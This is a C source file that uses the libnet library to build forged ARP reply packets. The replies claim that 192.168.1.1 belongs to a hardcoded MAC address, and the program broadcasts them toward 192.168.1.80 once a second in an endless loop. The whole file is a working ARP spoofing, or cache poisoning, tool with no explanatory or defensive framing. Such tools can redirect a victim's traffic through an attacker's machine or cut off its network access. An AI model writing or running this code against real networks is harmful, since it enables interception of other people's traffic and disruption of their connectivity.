#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/errno.h>
#include <stdlib.h>

#define ETH	"wlp2s0"

void err_sys(const char *msg)
{
	printf("%s:%s\n" ,msg, strerror(errno)); 
	exit(0);
}
int main(int argc, char*argv)
{
	libnet_t 			* lib;
	char	 			err_buf[50];
	libnet_ptag_t		ptag;
	struct in_addr		ip_src_addr, ip_dst_addr;
	unsigned char 		hw_addr[6] = {0x54, 0xee, 0x75, 0x39, 0xcb, 0x99};
	//unsigned char		hw_dsad[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	unsigned char		hw_dsad[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	//unsigned char		hw_dsad[6] = {0xc0, 0x18, 0x85, 0x50, 0xec, 0xc3};
	unsigned char		hw_req[6]={0};
	unsigned char		pad[18] = {0};
	
	if((lib = libnet_init(LIBNET_LINK, ETH, err_buf)) == NULL)
	{
		printf("libnet_init error : %s\n", err_buf);
		exit(0);
	}

	// Get my Interface IP address:
	printf("Interface : %s\n", libnet_addr2name4(libnet_get_ipaddr4(lib), LIBNET_RESOLVE));

	if(inet_pton(AF_INET, "192.168.1.1", (void *)&ip_src_addr) == -1)
		err_sys("inet_pton error");
	if(inet_pton(AF_INET, "192.168.1.80", (void *)&ip_dst_addr) == -1)
		err_sys("inet_pton error");

	// Create a ARP packge
	ptag = libnet_build_arp(0x0001, 0x0800, 6, 4, 2, 
							(u_int8_t*) hw_addr, (u_int8_t *)&ip_src_addr,
							(u_int8_t*) hw_req, (u_int8_t *)&ip_dst_addr,
							pad,18, lib, 0);
	ptag = libnet_build_ethernet((u_int8_t *)hw_dsad, (u_int8_t *)hw_addr,
								0x0806, NULL, 0, lib, 0);
	

	while(1)
	{
		sleep(1);
		if(libnet_write(lib) == -1)
			err_sys("libnet_write error");	
	}
	

	libnet_destroy(lib);

	return 0;
}
